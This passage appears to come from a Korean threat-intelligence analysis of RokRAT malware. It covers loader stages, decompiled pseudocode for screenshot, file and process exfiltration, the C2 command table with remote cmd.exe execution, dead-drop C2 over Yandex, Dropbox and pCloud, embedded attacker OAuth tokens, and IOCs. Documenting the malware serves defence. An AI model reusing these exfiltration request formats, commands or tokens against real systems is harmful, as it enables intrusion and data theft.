<tbody>
<tr>
<td><code>sub_50</code></td>
<td>API hash resolver</td>
</tr>
<tr>
<td><code>sub_33C</code></td>
<td>Reflective PE loader 메인</td>
</tr>
<tr>
<td><code>sub_244</code></td>
<td>PE DOS/NT 헤더 파서</td>
</tr>
<tr>
<td><code>sub_2DC</code></td>
<td>DataDirectory 접근 헬퍼</td>
</tr>
<tr>
<td><code>sub_15C</code></td>
<td>Stage 5 디코드(XOR) + 로더 호출</td>
</tr>
<tr>
<td><code>sub_69C</code></td>
<td>x64 SEH</td>
</tr>
<tr>
<td><code>sub_738</code> / <code>sub_73F</code></td>
<td>자기 위치 획득 트릭 (<code>mov rax, [rsp]; ret + add rax 0ch</code>)</td>
</tr>
</tbody>
</table>
<p><strong>API hash resolver (<code>sub_50</code>)</strong></p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>추정 함수</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>0x5BCD174B</code></td>
<td><code>RtlAllocateHeap</code>/<code>HeapAlloc</code>/<code>malloc</code></td>
</tr>
<tr>
<td><code>0xAA7ADB76</code></td>
<td><code>VirtualAlloc</code></td>
</tr>
<tr>
<td><code>0x234CCD4B</code></td>
<td><code>memcpy</code>/<code>RtlCopyMemory</code></td>
</tr>
<tr>
<td><code>0x406FAB8E</code></td>
<td><code>LoadLibraryA</code></td>
</tr>
<tr>
<td><code>0xE99E570A</code></td>
<td><code>GetProcAddress</code></td>
</tr>
<tr>
<td><code>0x26EB2DC1</code></td>
<td><code>VirtualFree</code></td>
</tr>
</tbody>
</table>
<p><strong>Reflective PE 매핑 (<code>sub_33C</code>)</strong></p>
<pre class="highlight"><code>1. DOS/NT 헤더 파싱 (sub_244)
2. VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
3. PE 헤더 + 모든 섹션 복사 (memcpy)
4. Import Directory 순회:
   for each DLL: hMod = LoadLibraryA(name)
   for each name/ord: addr = GetProcAddress(hMod, name)
5. Base Relocation 처리:
   types 1, 2, 3, 10 (HIGH/LOW/HIGHLOW/DIR64)
6. EntryPoint RVA 반환
</code></pre>

<p><strong>Stage 4 디코드 (<code>sub_15C</code>)</strong></p>
<pre class="highlight"><code class="language-c">char  key  = a1[0];           // 1바이트 키 = 0x29
DWORD size = *(DWORD*)(a1+1); // 4바이트 stage 5 크기 = 0x105800
char* enc  = a1 + 5;          // 암호화된 PE 시작

for (i = 0; i &lt; size; i++) enc[i] ^= key;   // XOR 0x29 디코드

if (sub_33C(enc, size, &amp;mapped) == 0)
    sub_69C(&amp;mapped);         // x64 SEH
</code></pre>

<p><strong>자기 위치 획득 트릭</strong>: <code>sub_73F</code>가 <code>mov rax, [rsp]; ret</code>로 자신의 return address를 반환 → <code>sub_738</code>이 <code>add rax, 12</code>로 stage 5 데이터 시작 주소를 만듭니다. PIC shellcode의 표준 기법.</p>
<table>
<thead>
<tr>
<th>항목</th>
<th>값</th>
</tr>
</thead>
<tbody>
<tr>
<td>Stage 5 시작 (PIC offset)</td>
<td><code>0x749</code></td>
</tr>
<tr>
<td>헤더 형식</td>
<td><code>[1B XOR_key][4B PE_size][암호화 PE]</code></td>
</tr>
<tr>
<td>XOR 키</td>
<td><code>0x29</code></td>
</tr>
<tr>
<td>Stage 5 크기</td>
<td><code>0x105800</code> (1,071,104 bytes)</td>
</tr>
<tr>
<td>Loader 패턴</td>
<td>sRDI / Stephen Fewer reflective DLL loader 계열</td>
</tr>
</tbody>
</table>
<h4>Stage 5 <strong>— 최종 페이로드 RokRAT</strong></h4>
<p><strong>메인 루틴(WinMain)</strong></p>
<pre class="highlight"><code class="language-c">WinMain(hInstance=0x140000000, hPrevInstance, lpCmdLine, nShowCmd) {
    // RSA 공개키 객체 초기화
    sub_1400115B4(&amp;xmmword_1400FE4F0,
                  xmmword_1400FE4F0,
                  pubkey_DER_start,    // 0x1400F60D0
                  pubkey_DER_end);     // 0x1400F61F4

    // 시스템 정보 + 세션 키 생성
    sub_1400124B4();

    // 환경 플래그 = &quot;disable&quot;
    qword_1400FE19C = 0x656C6261736964;

    // 메인 비콘 스레드
    HANDLE h = CreateThread(NULL, 0, StartAddress, NULL, 0, &amp;tid);
    WaitForSingleObject(h, INFINITE);
    return 0;
}
</code></pre>

<p><strong>시스템 정보 (<code>sub_1400124B4</code>)</strong></p>
<pre class="highlight"><code class="language-c">srand(time64(NULL));

// 호스트 핑거프린트
sprintf(word_1400FDD94, L&quot;%04X%04X&quot;, rand(), rand());                 // host ID (8자)
sprintf(word_1400FE222, L&quot;%04X%04X%08X&quot;, rand(), rand(), GetTickCount());  // 보조 ID
sprintf(word_1400FE24A, L&quot;%04X%04X%08X&quot;, rand(), rand(), GetTickCount());  // 메인 ID

// 시스템 정보 수집
GetModuleHandleA(&quot;ntdll&quot;) + GetProcAddress(&quot;RtlGetVersion&quot;) → OS 버전
GetWindowsDirectoryW + GetFileVersionInfoSizeA + VerQueryValueA  → 시스템 파일 버전
GetComputerNameW
GetUserNameW
RegOpenKeyExA + RegQueryValueExA → 추가 레지스트리 조회 (HW UUID 등)
fopen + fread → 추가 파일 읽기
</code></pre>

<p><strong>메인 비콘 (<code>StartAddress</code>)</strong></p>
<pre class="highlight"><code class="language-c">for (i = 0; i &lt; 100; i++) {
    for (entry = unk_1400F5CC0; entry &lt; unk_1400F60C8; entry += 516) {
        flag = entry-&gt;flag;
        token = entry-&gt;token;
        // C2 자격증명 테이블을 순회하며 활성 C2 확인
        sub_14001B750(req, flag, token, L&quot;virtual&quot;, L&quot;test&quot;, L&quot;key&quot;);  // 통신 테스트
        sub_14001B7F0(req);
        result = sub_14001D7F0(req, L&quot;/&quot;, &amp;status, &amp;has_data);
        if (has_data) break;  // 명령 수신되면 break
    }

    if (entry &lt; unk_1400F60C8) {
        dword_1400FDD8C = entry-&gt;flag;  // 활성 백엔드 선택
        sub_14001B750(&amp;main_req, flag, token, L&quot;real&quot;, L&quot;pack&quot;, L&quot;team&quot;);  // 실제 모드
        break;
    }
    Sleep(10000);
}

if (i != 100 &amp;&amp; !sub_140012CD8()) {  // 명령 디스패처
    do {
        Sleep(1000);
        for (j = 3; !sub_1400156A8() &amp;&amp; j; --j) Sleep(5000);
        for (k = 60; k; --k) Sleep(1000);  // 1분 대기
    } while (!sub_140012CD8());
}
</code></pre>

<p><strong>스크린샷 및 실행 프로세스 수집 모듈</strong> (<code>sub_1400156A8</code>)</p>
<p>트리거 및 주기</p>
<ul>
<li>메인 비콘 스레드 <code>StartAddress @ 0x140015AD8</code>의 do-while 루프에서 호출</li>
<li>C2 명령과 무관하게 약 61초마다 1회 실행 (분당 1회)</li>
<li>실패 시 5초 간격으로 최대 3회 재시도</li>
</ul>
<pre class="highlight"><code class="language-c">_BOOL8 sub_1400156A8()
{
    // [Phase 0] 토글 체크 — '0'/'i' 명령으로 제어
    if (!byte_1400F5CB0)
        return 1;                                       // 비활성 시 성공 리턴

    // [Phase 1] 시그니처 헤더 빌드 — 4바이트 &quot;FADEADBA&quot; (0xFA 0xDE 0xAD 0xBA)
    sub_140015D64(payload, 0xFA);
    sub_140015D64(payload, 0xDE);
    sub_140015D64(payload, 0xAD);
    sub_140015D64(payload, 0xBA);

    // 디버거 감지 마커
    byte_1400FE14A = IsDebuggerPresent() ? 0x31 : byte_1400FE14A;   // '1' or 기존값
    sub_140015D64(payload, 0x28);                       // '(' 마커 append

    // [Phase 2] 화면 캡처 (GDI / GDI+)
    hCompatDC = CreateCompatibleDC(NULL);
    hScreenDC = GetDC(NULL);
    hBitmap   = CreateCompatibleBitmap(hScreenDC, w, h);
    SelectObject(hCompatDC, hBitmap);
    BitBlt(hCompatDC, 0, 0, w, h, GetDC(NULL),
           0, 0, SRCCOPY /* 0xCC0020 */);

    // [Phase 3] JPEG 인코딩 (Gdiplus)
    jpeg_size = sub_1400117EC(hBitmap, ..., &amp;jpeg_buf);
        // └─ image/jpeg 인코더 선택 + GdipSaveImageToFile
        // └─ 임시파일: %TEMP%\{rand}.tmp → 메모리로 재로드
    DeleteObject(hBitmap);

    // JPEG 본문을 페이로드에 추가 (헤더 + JPEG)
    sub_1400115B4(payload, jpeg_buf, &amp;jpeg_size);
    sub_1400110B4(payload, jpeg_buf, jpeg_size);
    free(jpeg_buf);
    GdiplusShutdown(token);

    // [Phase 4] 6회마다 1회 추가 정보 동봉 (최대 0x20000 = 128KB)
    if (dword_1400FDD88 % 6 == 0) {
        buf2 = operator new(0x20000);
        proc_list_size = sub_140011C94(buf2, 0x20000);  //  프로세스 목록
                                                        //   pid:%d,name:%s,path:%s%s
    }

    // [Phase 5] 클라우드 경로 생성
    tick = GetTickCount();
    r1 = rand(); r2 = rand();
    wsprintfW(cloud_path, L&quot;/Comment/%04X%04X%08X&quot;, r2, r1, tick);
    dword_1400FDD88++;                                  // 캡처 카운터 증가

    // [Phase 6] ★ XOR 인코딩 (4바이트 rand 키, 바이트 단위 순환)
    xor_key  = (rand() &amp; 0xFFFF) | ((rand() &amp; 0xFFFF) &lt;&lt; 16);
    for (i = 0; i &lt; payload.size; i++)
        payload[i] ^= ((BYTE*)&amp;xor_key)[i &amp; 3];

    // [Phase 7] ★ AES 암호화
    sub_1400119E4(payload);

    // [Phase 8] 클라우드 업로드
    std::wstring::assign(path_w, cloud_path);
    norm = sub_140015E84(out, payload);
    return sub_14001F300(ctx, path_w, norm) == 1;       // 활성 백엔드로 PUT
}
</code></pre>

<h3><strong>C2 명령 프로토콜</strong></h3>
<p>C2 응답의 첫 글자가 명령 코드 (단일 ASCII 바이트). 메인 디스패처: <code>sub_140012CD8 @ 0x140012CD8</code></p>
<table>
<thead>
<tr>
<th>코드</th>
<th>동작</th>
<th>비고</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>'0'</code></td>
<td>스크린샷 캡처 비활성</td>
<td><code>byte_1400F5CB0 = 0</code></td>
</tr>
<tr>
<td><code>'i'</code></td>
<td>스크린샷 캡처 활성</td>
<td><code>byte_1400F5CB0 = 1</code></td>
</tr>
<tr>
<td><code>'b'</code></td>
<td>즉시 종료</td>
<td><code>ExitProcess(0x81)</code></td>
</tr>
<tr>
<td><code>'j'</code></td>
<td>즉시 종료</td>
<td><code>ExitProcess(0x81)</code></td>
</tr>
<tr>
<td><code>'d'</code></td>
<td>자기 정리 + 종료</td>
<td>인코딩 wchar 시퀀스 디코드 → <code>del</code> 명령</td>
</tr>
<tr>
<td><code>'f'</code></td>
<td>자기 정리 + 종료</td>
<td><code>'d'</code>의 짧은 변종</td>
</tr>
<tr>
<td><code>'g'</code></td>
<td>하트비트</td>
<td>ack만 보내고 즉시 리턴(봇 살아있는지 확인)</td>
</tr>
<tr>
<td><code>'h'</code></td>
<td>드라이브 인벤토리 → 업로드</td>
<td><code>sub_14001233C</code> 호출</td>
</tr>
<tr>
<td><code>'e'</code></td>
<td>임의 명령 실행 (RCE)</td>
<td><code>ShellExecuteW("open","cmd.exe","/c \"&amp;lt;arg&amp;gt;\"")</code></td>
</tr>
<tr>
<td><code>'c'</code></td>
<td>파일 수집 업로드</td>
<td><code>FindFirstFileW</code> + <code>sub_140015164</code> 호출, <code>Normal</code>/<code>All</code> 모드</td>
</tr>
<tr>
<td><code>'1','2'</code></td>
<td>다운로드 + 메모리 실행</td>
<td>추가 페이로드 메모리 실행</td>
</tr>
<tr>
<td><code>'5','6'</code></td>
<td>다운로드 + 디스크 파일 실행</td>
<td><code>%TEMP%</code>에 다운로드 후 실행</td>
</tr>
<tr>
<td><code>'3','4'</code></td>
<td>XOR 복호화/검증 → 메모리 실행</td>
<td>XOR + 검증 후 실행</td>
</tr>
<tr>
<td><code>'7','8','9'</code></td>
<td>XOR 복호화/검증 → 디스크 드롭 실행</td>
<td><code>%TEMP%</code>에 있는 파일 복호화 후 실행</td>
</tr>
</tbody>
</table>
<p><strong><code>'d'</code>/<code>'f'</code> 디코드 알고리즘</strong></p>
<pre class="highlight"><code class="language-python">key = first_wide_char.low_byte
for i in range(1, len):
    out[i-1] = (wide[i].low_byte - key) &amp; 0xFF
</code></pre>

<p><strong><code>'d'</code> 디코드 결과 — 아티팩트 삭제 명령</strong></p>
<pre class="highlight"><code class="language-bash">del &quot;%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.VBS&quot;
    &quot;%appdata%\*.CMD&quot;
    &quot;%appdata%\*.BAT&quot;
    &quot;%appdata%\*01&quot;
    &quot;%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk&quot;
    &quot;%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk&quot;
    /F /Q
</code></pre>

<p>아티팩트 삭제 명령은 RokRAT 악성코드가 평소에 사용하는 지속성 유지를 위한 경로를 알 수 있습니다.</p>
<ul>
<li><code>%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*.VBS / *.lnk</code></li>
<li><code>%allusersprofile%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk</code></li>
<li><code>%appdata%\*.CMD / *.BAT / *01</code></li>
</ul>
<p><strong><code>'h'</code> 명령 — 드라이브 별 폴더 및 파일 정보 수집 (<code>sub_14001233C</code>)</strong></p>
<pre class="highlight"><code class="language-c">GetLogicalDriveStringsA로 모든 드라이브 열거
for each drive of type 2~4 (REMOVABLE/FIXED/REMOTE) {
    sprintf(&quot;dir /A /S %s &gt;&gt; \&quot;%%temp%%/%c_.TMP\&quot;&quot;, drive, drive_letter)
    sub_14000EB1C(cmd, wait=true, timeout=600s, prefix=false)
      // └─ ShellExecuteExA(open, cmd.exe, /C &amp;lt;cmd&amp;gt;) + WaitForSingleObject

    sprintf(file, &quot;%TEMP%/&amp;lt;드라이브&amp;gt;_.TMP&quot;)
    sub_140015164(file)  // 업로드
    DeleteFileW(file)    // 흔적 삭제
}
</code></pre>

<p><strong><code>'e'</code> 명령 — 임의 명령 실행 (RCE)</strong></p>
<pre class="highlight"><code class="language-c">wsprintfW(buf, L&quot;/c \&quot;%s\&quot;&quot;, command_arg);
ShellExecuteW(NULL, L&quot;open&quot;, L&quot;cmd.exe&quot;, buf, NULL, SW_HIDE);
</code></pre>

<p><strong><code>'c'</code> 명령 — 파일 수집 업로드 (<code>sub_140015164</code>)</strong></p>
<pre class="highlight"><code class="language-c">FindFirstFileW(Parameters, &amp;FindFileData);
FindClose(...);
if (FindFileData.dwFileAttributes &amp; 0x10) {     // 디렉토리
    goto MODE_BRANCH;                            // Normal/All 모드 처리
} else {
    sub_140015164(Parameters, &amp;FindFileData);    // 단일 파일 업로드
}

MODE_BRANCH:
    wcsicmp(String, &quot;Normal&quot;);                   // String은 응답 페이로드에서 추출된 모드 토큰
    if (== 0) {
        // 표적 확장자 8종 빌드 (.XLS .DOC .PPT .TXT .M4A .AMR .PDF .HWP)
        // → 해당 확장자 파일만 sub_140015164로 업로드
    } else if (wcsicmp(String, &quot;All&quot;) == 0) {
        // 전체 파일 업로드
    }
</code></pre>

<table>
<thead>
<tr>
<th>단계</th>
<th>파일 업로드 (<code>sub_140015164</code>)</th>
<th>스크린샷 업로드 (<code>sub_1400156A8</code>)</th>
</tr>
</thead>
<tbody>
<tr>
<td>데이터 수집</td>
<td><code>fread()</code> 파일 본문</td>
<td>GDI 캡처 + JPEG 인코딩</td>
</tr>
<tr>
<td>암호화</td>
<td>없음</td>
<td>xor + AES-128-CBC</td>
</tr>
<tr>
<td>클라우드 경로</td>
<td><code>/Comment/{4hex}292ACC33D2{4hex}</code></td>
<td><code>/Comment/{4hex}{4hex}{8hex}</code></td>
</tr>
<tr>
<td>업로드</td>
<td><code>sub_14001F300</code></td>
<td><code>sub_14001F300</code></td>
</tr>
</tbody>
</table>
<h3><strong>C2 백엔드 (다중 클라우드)</strong></h3>
<table>
<thead>
<tr>
<th>클래스</th>
<th>클라우드 서비스</th>
<th>시그니처</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>CYanApi</code></td>
<td><strong>Yandex</strong></td>
<td>OAuth refresh token <code>y0__</code> prefix</td>
</tr>
<tr>
<td><code>CDropApi</code></td>
<td><strong>Dropbox</strong></td>
<td>API 응답에 <code>server_modified</code> 필드</td>
</tr>
<tr>
<td><code>CPcloudApi</code></td>
<td><strong>pCloud</strong></td>
<td>RTTI 기반</td>
</tr>
</tbody>
</table>
<p><strong>임베디드 OAuth 토큰 (Yandex)</strong></p>
<pre class="highlight"><code>y0__xCvwqD6BxiitDUgtK7BqRJKUd5n0zFOnE5JA1vpobhCHkgkZg
y0__xCgjYyMBxjIhDUgqp2umhIg72AOcJ1RXdfk-fIWhJrHtL7_Iw
</code></pre>

<p><strong>클라우드 폴더 구조</strong></p>
<ul>
<li><code>/Program/&amp;lt;host_id&amp;gt;/...</code> — 명령 실행 ACK 전용 경로 (폴링 경로 아님; 아래 참조)</li>
<li><code>/Comment/&amp;lt;XXXX&amp;gt;**292ACC33D2**&amp;lt;XXXX&amp;gt;</code> — 파일 데이터 유출</li>
<li><strong><code>292ACC33D2</code></strong>는 <strong>고유 캠페인/빌드 ID</strong></li>
</ul>
<h3><strong>C2 폴링 및 통신 메커니즘</strong></h3>
<h4>자격증명 테이블 구조</h4>
<p>C2 자격증명 테이블은 <code>g_c2_server_slots</code> (<code>0x1400F5CC0</code>)에 저장되며, 엔트리 stride는 <strong>516바이트</strong> (129 × <code>DWORD</code>)입니다. OAuth 토큰은 <code>g_yandex_oauth_tokens</code> (<code>0x1400F5CC4</code>)에 병렬 배열로 저장됩니다. 각 엔트리의 <code>flag</code> 필드가 백엔드 타입을 결정합니다:</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>백엔드</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>1</code></td>
<td>LocalFS (내부 테스트/폴백)</td>
</tr>
<tr>
<td><code>3</code></td>
<td>Dropbox</td>
</tr>
<tr>
<td><code>4</code></td>
<td>pCloud</td>
</tr>
<tr>
<td><code>5</code></td>
<td>Yandex Disk</td>
</tr>
</tbody>
</table>
<p>최대 재시도 횟수: <strong>100회 × 10초 슬립 = 약 16.7분</strong> 후 포기.</p>
<h4>비콘 2단계 초기화</h4>
<pre class="highlight"><code class="language-c">// Phase 1 — 프로브: 연결 가능한 백엔드 탐색
c2_session_set_target(session, flag, token,
    L&quot;virtual&quot;, L&quot;test&quot;, L&quot;key&quot;);
c2_session_recv_response(session, L&quot;/&quot;, &amp;count, &amp;err);  // 루트 디렉토리 폴링

// Phase 2 — 활성 백엔드 확정 후 실 운영 모드 전환
c2_session_set_target(g_c2_session_object, active_flag, active_token,
    L&quot;real&quot;, L&quot;pack&quot;, L&quot;team&quot;);
</code></pre>

<p><code>L"pack"</code>, <code>L"team"</code> 은 클라우드 스토리지에서 명령 전달에 사용되는 폴더 경로 구성요소입니다.</p>
<h4>Dead-Drop 명령 전달 (파일명 인코딩)</h4>
<p>C2 명령은 파일 내용이 아닌 <strong>파일명의 첫 글자</strong>에 인코딩됩니다 — dead-drop 기법.</p>
<p><strong>Yandex Disk 폴링 요청:</strong></p>
<pre class="highlight"><code>GET https://cloud-api.yandex.net/v1/disk/resources?path=&amp;lt;폴링경로&amp;gt;&amp;limit=500
Authorization: OAuth y0__...
</code></pre>

<p><strong>파싱 JSON 필드 (<code>_embedded.items[]</code>):</strong></p>
<table>
<thead>
<tr>
<th>필드</th>
<th>역할</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>name[0]</code></td>
<td><strong>명령 코드</strong> (단일 ASCII 바이트)</td>
</tr>
<tr>
<td><code>type</code></td>
<td><code>"file"</code> 또는 <code>"dir"</code></td>
</tr>
<tr>
<td><code>path</code></td>
<td>해당 항목의 전체 클라우드 경로</td>
</tr>
<tr>
<td><code>size</code></td>
<td>파일 크기</td>
</tr>
<tr>
<td><code>modified</code></td>
<td>최종 수정 타임스탬프</td>
</tr>
</tbody>
</table>
<p>Dropbox (<code>POST /2/files/list_folder</code>)와 pCloud (<code>GET /listfolder</code>)도 동일한 dead-drop 방식입니다.</p>
<p><strong>응답 내 인증 오류 감지:</strong></p>
<table>
<thead>
<tr>
<th>포함 문자열</th>
<th>의미</th>
<th>처리</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nauthorizedError</code></td>
<td>OAuth 토큰 만료/폐기</td>
<td>다음 자격증명 슬롯으로 폴백</td>
</tr>
<tr>
<td><code>Error</code></td>
<td>API 일반 오류</td>
<td>다음 자격증명 슬롯으로 폴백</td>
</tr>
</tbody>
</table>
<h4><code>/Program/&amp;lt;host_id&amp;gt;</code> — ACK 경로 (폴링 경로 아님)</h4>
<p><code>/Program/&amp;lt;g_main_id&amp;gt;</code> 경로는 명령 폴링에 쓰이지 않습니다. 명령 실행 완료 후 C2에 전송하는 <strong>ACK 전용 경로</strong>입니다. 명령이 처리될 때마다 <code>build_path_program_hostid</code>가 이 경로를 조립하고 <code>cloud_api_send_ack</code>를 호출합니다:</p>
<pre class="highlight"><code class="language-c">// build_path_program_hostid @ 0x140012C54
wsprintfW(path, L&quot;/%s/%s&quot;, L&quot;Program&quot;, &amp;g_main_id);
cloud_api_send_ack(&amp;g_c2_session_object, path);   // 모든 명령 처리 후 호출
</code></pre>

<p><code>g_main_id</code>는 시작 시 생성되는 16자 hex 머신 식별자(<code>%04X%04X%08X</code>)입니다. 공격자는 폴더명만으로 어느 감염 호스트의 ACK인지 식별합니다.</p>
<h4>데이터 유출 — <code>Content-Type: voice/mp3</code> 위장</h4>
<p>세 클라우드 백엔드 모두 하드코딩된 <code>Content-Type: voice/mp3</code> 헤더(<code>0x1400D3938</code>)를 사용해 암호화된 유출 트래픽을 오디오 스트리밍처럼 위장합니다:</p>
<pre class="highlight"><code class="language-http">PUT /v1/disk/resources/upload?path=/Comment/XXXX292ACC33D2XXXX
Authorization: OAuth y0__...
Content-Type: voice/mp3

--wwjaughalvncjwiajs--
[AES-128-CBC 암호화 페이로드]
--wwjaughalvncjwiajs----
</code></pre>

<h4>백엔드별 API 엔드포인트</h4>
<table>
<thead>
<tr>
<th>백엔드</th>
<th>명령 폴링</th>
<th>데이터 업로드</th>
<th>인증 헤더</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Yandex Disk</strong></td>
<td><code>GET cloud-api.yandex.net/v1/disk/resources?path=&lt;P&gt;&amp;limit=500</code></td>
<td><code>PUT cloud-api.yandex.net/v1/disk/resources/upload</code></td>
<td><code>OAuth y0__...</code></td>
</tr>
<tr>
<td><strong>Dropbox</strong></td>
<td><code>POST api.dropboxapi.com/2/files/list_folder</code></td>
<td><code>POST content.dropboxapi.com/2/files/upload</code></td>
<td><code>Bearer &amp;lt;token&amp;gt;</code></td>
</tr>
<tr>
<td><strong>pCloud</strong></td>
<td><code>GET api.pcloud.com/listfolder</code></td>
<td><code>POST api.pcloud.com/uploadfile</code></td>
<td>OAuth access_token</td>
</tr>
</tbody>
</table>
<h3><strong>암호 시스템</strong></h3>
<p><strong>임베디드 RSA 공개키</strong></p>
<pre class="highlight"><code>Modulus size  : 2048-bit
publicExponent: 17 (0x11)  ← 비표준 (정상은 65537)
SPKI SHA256   : 62b069a49c772367c2d7ace2f3fd45be53e8431549cc050ee8f8955eccc61326
Modulus SHA256: 3253d1149320d7c706442c4fb7883d0ed84f9335af85ed7d4c12a2f3993ab5ae
</code></pre>

<p><strong><code>e=17</code> 비표준 공개 지수</strong></p>
<p><code>e=17</code>은 페르마 소수(F3)로, 수학적으로 유효한 RSA 공개 지수입니다. 대부분의 구현이 기본값으로 <code>e=65537</code>(F4)을 사용하지만, OpenSSL 등 표준 도구에서도 지수를 명시적으로 지정하면 <code>e=17</code> 키를 생성할 수 있습니다. 따라서 자체 키 생성 도구의 증거라기보다는, 공격자가 키 생성 파라미터를 <strong>의도적으로 비표준 값으로 지정</strong>했음을 시사합니다.</p>
<p><strong>암호 통신 흐름</strong></p>
<pre class="highlight"><code>업로드:
  1. AES-128-CBC(session_key, random IV)로 평문 암호화
  2. session_key를 RSA(공격자_공개키)로 암호화
  3. multipart/form-data (boundary=--wwjaughalvncjwiajs--)에 결합
  4. Yandex/Dropbox/pCloud API로 PUT

응답:
  1. 클라우드에서 파일 GET
  2. AES-128-CBC로 복호화 → 단일 문자 명령 + 인자
</code></pre>

<p><strong>세션 키 출처</strong>: 매 실행마다 <code>CryptoPP::AutoSeededRandomPool</code> (<code>CryptGenRandom</code> 기반)으로 새로 생성. 정적 추출 불가</p>
<h2>3. 침해 지표</h2>
<p><strong>md5</strong></p>
<pre class="highlight"><code>ea95109b608841d2f99a25bd2646ff43  stage3_payload.bin
339d68ebd97bd65c2e5cec57ffd3159c  stage4_payload.bin
2f3dff7779795fc01291b0a31d723aca  stage5_payload.bin
ceabad2cc6a94b00d163bf016ccc1aa2  version.dll
f13a4834e3e1613857b84a1203e2e182  북한 노동당 창건 80주년 행사 동향 종합.hwp
</code></pre>

<p><strong>C2</strong></p>
<p>Yandex, Dropbox, pCloud 클라우드 서비스</p>
</div></details>

